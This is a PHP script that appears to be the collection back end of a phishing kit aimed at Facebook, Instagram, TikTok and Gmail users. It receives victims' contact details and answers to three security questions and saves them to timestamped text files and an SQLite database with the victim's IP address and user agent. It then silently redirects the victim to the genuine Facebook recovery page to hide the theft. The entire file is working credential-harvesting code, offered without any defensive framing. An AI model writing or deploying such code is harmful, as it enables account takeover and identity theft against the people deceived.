<?php
session_start();
class RecoveryDataCapture {
    private $captureDir;
    private $dbFile;
    public function __construct($platform) {
        $codes = ['facebook'=>'FB','instagram'=>'INS','tiktok'=>'TK','gmail'=>'GML'];
        $code = $codes[$platform] ?? 'UNK';
        $this->captureDir = '../../captures/' . $code;
        if (!file_exists($this->captureDir)) mkdir($this->captureDir, 0755, true);
        $this->dbFile = $this->captureDir . '/' . $code . '_recovery.db';
        $this->initDB();
    }
    private function initDB() {
        try {
            $db = new SQLite3($this->dbFile);
            $db->exec('CREATE TABLE IF NOT EXISTS recovery_data (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                timestamp DATETIME DEFAULT CURRENT_TIMESTAMP,
                contact TEXT,
                recovery_method TEXT,
                question_1 TEXT,
                question_2 TEXT,
                question_3 TEXT,
                ip_address TEXT,
                user_agent TEXT
            )');
            $db->close();
        } catch (Exception $e) {}
    }
    private function getIP() {
        $ip = $_SERVER['REMOTE_ADDR'] ?? '';
        return filter_var($ip, FILTER_VALIDATE_IP) ? $ip : 'Unknown';
    }
    public function save($data) {
        $ip = $this->getIP();
        $ua = $_SERVER['HTTP_USER_AGENT'] ?? '';
        $txtFile = $this->captureDir . '/RECOVERY_' . date('Ymd_His') . '.txt';
        $content = "RECOVERY DATA\nContact: {$data['contact']}\nQ1: {$data['question_1']}\nQ2: {$data['question_2']}\nQ3: {$data['question_3']}\nIP: $ip\nUA: $ua\n";
        file_put_contents($txtFile, $content);
        try {
            $db = new SQLite3($this->dbFile);
            $stmt = $db->prepare('INSERT INTO recovery_data (contact,recovery_method,question_1,question_2,question_3,ip_address,user_agent) VALUES (:c,:m,:q1,:q2,:q3,:ip,:ua)');
            $stmt->bindValue(':c',$data['contact']); $stmt->bindValue(':m','security_questions'); $stmt->bindValue(':q1',$data['question_1']); $stmt->bindValue(':q2',$data['question_2']); $stmt->bindValue(':q3',$data['question_3']); $stmt->bindValue(':ip',$ip); $stmt->bindValue(':ua',$ua);
            $stmt->execute(); $db->close();
        } catch(Exception $e){}
        header('Location: https://www.facebook.com/login/identify/');
        exit;
    }
}
if ($_SERVER['REQUEST_METHOD']==='POST') {
    $platform = $_POST['platform'] ?? 'facebook';
    $capture = new RecoveryDataCapture($platform);
    $capture->save($_POST);
}
?>